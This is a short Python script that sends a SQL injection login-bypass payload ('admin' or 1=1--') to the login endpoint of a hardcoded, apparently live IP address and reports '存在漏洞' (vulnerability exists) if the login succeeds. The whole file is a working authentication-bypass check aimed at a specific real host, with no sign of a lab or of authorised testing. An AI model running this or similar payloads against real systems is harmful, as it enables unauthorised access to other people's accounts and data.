import requests

data={
    'strName':"admin' or 1=1--",
    'strPwd':''
}
url='http://223.68.174.194:8888/Login/Check'
rep=requests.post(url,data=data)
if rep.text=='ok':
    print("存在漏洞")
